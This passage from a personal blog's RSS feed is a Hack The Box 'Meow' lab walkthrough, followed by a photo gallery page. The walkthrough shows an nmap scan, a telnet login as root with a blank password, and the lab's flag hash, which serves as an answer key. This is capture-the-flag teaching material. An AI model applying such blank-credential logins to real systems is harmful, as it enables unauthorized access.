<pre tabindex="0"><code>openvpn</code></pre>
</br>
<h5 id="task-4">TASK 4</h5>
<p>What tool do we use to test our connection to the target with an ICMP echo request?</p>






<pre tabindex="0"><code>ping</code></pre>
</br>
<h5 id="task-5">TASK 5</h5>
<p>What is the name of the most common tool for finding open ports on a target?</p>






<pre tabindex="0"><code>nmap</code></pre>
</br>
<h5 id="task-6">TASK 6</h5>
<p>What service do we identify on port23/tcp during our scans?</p>






<pre tabindex="0"><code>telnet</code></pre>






<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 1</span><span>┌─<span style="color:#89dceb;font-weight:bold">[</span>us-starting-point-vip-1-dhcp<span style="color:#89dceb;font-weight:bold">]</span>─<span style="color:#89dceb;font-weight:bold">[</span>10.10.14.27<span style="color:#89dceb;font-weight:bold">]</span>─<span style="color:#89dceb;font-weight:bold">[</span>leewookb@htb-psvucohdrg<span style="color:#89dceb;font-weight:bold">]</span>─<span style="color:#89dceb;font-weight:bold">[</span>~<span style="color:#89dceb;font-weight:bold">]</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 2</span><span>└──╼ <span style="color:#89dceb;font-weight:bold">[</span>★<span style="color:#89dceb;font-weight:bold">]</span>$ nmap -sC -sV 10.129.67.74 -p <span style="color:#fab387">23</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 3</span><span>Starting Nmap 7.93 <span style="color:#89dceb;font-weight:bold">(</span> https://nmap.org <span style="color:#89dceb;font-weight:bold">)</span> at 2024-06-17 05:20 BST
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 4</span><span>Nmap scan report <span style="color:#cba6f7">for</span> 10.129.67.74
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 5</span><span>Host is up <span style="color:#89dceb;font-weight:bold">(</span>0.0098s latency<span style="color:#89dceb;font-weight:bold">)</span>.
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 6</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 7</span><span>PORT   STATE SERVICE VERSION
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 8</span><span>23/tcp open  telnet  Linux telnetd
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 9</span><span>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">10</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">11</span><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">12</span><span>Nmap <span style="color:#cba6f7">done</span>: <span style="color:#fab387">1</span> IP address <span style="color:#89dceb;font-weight:bold">(</span><span style="color:#fab387">1</span> host up<span style="color:#89dceb;font-weight:bold">)</span> scanned in 20.48 seconds
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">13</span><span>┌─<span style="color:#89dceb;font-weight:bold">[</span>us-starting-point-vip-1-dhcp<span style="color:#89dceb;font-weight:bold">]</span>─<span style="color:#89dceb;font-weight:bold">[</span>10.10.14.27<span style="color:#89dceb;font-weight:bold">]</span>─<span style="color:#89dceb;font-weight:bold">[</span>leewookb@htb-psvucohdrg<span style="color:#89dceb;font-weight:bold">]</span>─<span style="color:#89dceb;font-weight:bold">[</span>~<span style="color:#89dceb;font-weight:bold">]</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">14</span><span>└──╼ <span style="color:#89dceb;font-weight:bold">[</span>★<span style="color:#89dceb;font-weight:bold">]</span>$</span></span></code></pre></div>
</br>
<h5 id="task-7">TASK 7</h5>
<p>What username is able to log into target over telnet with a blank password?</p>






<pre tabindex="0"><code>root</code></pre>






<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 1</span><span>┌─<span style="color:#89dceb;font-weight:bold">[</span>us-starting-point-vip-1-dhcp<span style="color:#89dceb;font-weight:bold">]</span>─<span style="color:#89dceb;font-weight:bold">[</span>10.10.14.27<span style="color:#89dceb;font-weight:bold">]</span>─<span style="color:#89dceb;font-weight:bold">[</span>leewookb@htb-psvucohdrg<span style="color:#89dceb;font-weight:bold">]</span>─<span style="color:#89dceb;font-weight:bold">[</span>~<span style="color:#89dceb;font-weight:bold">]</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 2</span><span>└──╼ <span style="color:#89dceb;font-weight:bold">[</span>★<span style="color:#89dceb;font-weight:bold">]</span>$ telnet 10.129.67.74
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 3</span><span>Trying 10.129.67.74...
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 4</span><span>Connected to 10.129.67.74.
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 5</span><span>Escape character is <span style="color:#a6e3a1">&#39;^]&#39;</span>.
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 6</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 7</span><span>  █  █         ▐▌     ▄█▄ █          ▄▄▄▄
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 8</span><span>  █▄▄█ ▀▀█ █▀▀ ▐▌▄▀    █  █▀█ █▀█    █▌▄█ ▄▀▀▄ ▀▄▀
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 9</span><span>  █  █ █▄█ █▄▄ ▐█▀▄    █  █ █ █▄▄    █▌▄█ ▀▄▄▀ █▀█
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">10</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">11</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">12</span><span>Meow login: root
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">13</span><span>Welcome to Ubuntu 20.04.2 LTS <span style="color:#89dceb;font-weight:bold">(</span>GNU/Linux 5.4.0-77-generic x86_64<span style="color:#89dceb;font-weight:bold">)</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">14</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">15</span><span> * Documentation:  https://help.ubuntu.com
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">16</span><span> * Management:     https://landscape.canonical.com
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">17</span><span> * Support:        https://ubuntu.com/advantage
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">18</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">19</span><span>  System information as of Mon <span style="color:#fab387">17</span> Jun <span style="color:#fab387">2024</span> 04:26:46 AM UTC
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">20</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">21</span><span>  System load:           0.0
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">22</span><span>  Usage of /:            41.7% of 7.75GB
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">23</span><span>  Memory usage:          4%
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">24</span><span>  Swap usage:            0%
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">25</span><span>  Processes:             <span style="color:#fab387">135</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">26</span><span>  Users logged in:       <span style="color:#fab387">0</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">27</span><span>  IPv4 address <span style="color:#cba6f7">for</span> eth0: 10.129.67.74
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">28</span><span>  IPv6 address <span style="color:#cba6f7">for</span> eth0: dead:beef::250:56ff:feb0:4ed1
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">29</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">30</span><span> * Super-optimized <span style="color:#cba6f7">for</span> small spaces - <span style="color:#89dceb">read</span> how we shrank the memory
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">31</span><span>   footprint of MicroK8s to make it the smallest full K8s around.
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">32</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">33</span><span>   https://ubuntu.com/blog/microk8s-memory-optimisation
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">34</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">35</span><span><span style="color:#fab387">75</span> updates can be applied immediately.
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">36</span><span><span style="color:#fab387">31</span> of these updates are standard security updates.
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">37</span><span>To see these additional updates run: apt list --upgradable
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">38</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">39</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">40</span><span>The list of available updates is more than a week old.
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">41</span><span>To check <span style="color:#cba6f7">for</span> new updates run: sudo apt update
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">42</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">43</span><span>Last login: Mon Sep  <span style="color:#fab387">6</span> 15:15:23 UTC <span style="color:#fab387">2021</span> from 10.10.14.18 on pts/0
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">44</span><span>root@Meow:~#</span></span></code></pre></div>
</br>
<h5 id="submit-flag">SUBMIT FLAG</h5>
<p>Submit root flag</p>






<pre tabindex="0"><code>b40abdfe23665f766f9c61ecba8a4c19</code></pre>






<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">1</span><span>root@Meow:~# ls
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">2</span><span>flag.txt snap
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">3</span><span>root@Meow:~# cat flag.txt
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">4</span><span>b40abdfe23665f766f9c61ecba8a4c19
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">5</span><span>root@Meow:~#</span></span></code></pre></div>
<p><img src="./htb_meow.png" alt="meow_clear"></p>
]]></content:encoded>
    </item>
    <item>
      <title>Photos</title>
      <link>http://localhost:1313/photos/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><author>leewookb@gmail.com (Wook Lee)</author>
      <guid>http://localhost:1313/photos/</guid>
      <description> </description>
      <content:encoded><![CDATA[<div style="
    display: flex; 
    justify-content: center; 
    align-items: center; 
    flex-direction: column;">
<div style="display: inline-block; margin: 0 5px;">
    <img src="./leon_in_box.jpeg" alt="Image 1" style="width: 300px; height: auto;">
</div>
<!-- Image 4 -->
<div style="display: inline-block; margin: 0 5px;">
    <img src="./levi_in_dark.JPG" alt="Image 4" style="width: 300px; height: auto;">
</div>
<!-- Image 2 -->
<div style="display: inline-block; margin: 0 5px;">
    <img src="./levi_gopro.JPG" alt="Image 2" style="width: 300px; height: auto;">
</div>
<!-- Image 3 -->
<div style="display: inline-block; margin: 0 5px;">
    <img src="./leonlevi_kk.jpeg" alt="Image 3" style="width: 300px; height: auto;">
</div>
<!-- Image 6 -->
<div style="display: inline-block; margin: 0 5px;">
    <img src="./leon_and_levi.jpeg" alt="Image 5" style="width: 300px; height: auto;">
</div>
<!-- Image 7 -->
<div style="display: inline-block; margin: 0 5px;">
    <img src="./leon_film_camera.jpeg" alt="Image 5" style="width: 300px; height: auto;">
</div>
<!-- Image 8 -->
<div style="display: inline-block; margin: 0 5px;">
    <img src="./leon_close_shot.jpeg" alt="Image 5" style="width: 300px; height: auto;">
</div>
<!-- Image 9 -->
<div style="display: inline-block; margin: 0 5px;">
    <img src="./levi_close_shot.jpeg" alt="Image 5" style="width: 300px; height: auto;">
</div>
<!-- Image 10 -->
<div style="display: inline-block; margin: 0 5px;">
    <img src="./leon_close_shot_2.jpeg" alt="Image 5" style="width: 300px; height: auto;">
</div>
<!-- Image 11 -->
<div style="display: inline-block; margin: 0 5px;">
    <img src="./levi_sitting_on_a_stool.jpeg" alt="Image 5" style="width: 300px; height: auto;">
</div>
<!-- Image 11 -->
<div style="display: inline-block; margin: 0 5px;">
    <img src="./leon_hungry.jpeg" alt="leon_hungry" style="width: 300px; height: auto;">
</div>
<!-- Image 12 -->
<div style="display: inline-block; margin: 0 5px;">
    <img src="./levi_shocked.jpeg" alt="levi_shocked" style="width: 300px; height: auto;">
</div>
<!-- Image 13 -->
<div style="display: inline-block; margin: 0 5px;">
    <img src="./levi_staring.jpeg" alt="levi_shocked" style="width: 300px; height: auto;">
</div>
</div>
]]></content:encoded>
    </item>
  </channel>
</rss>
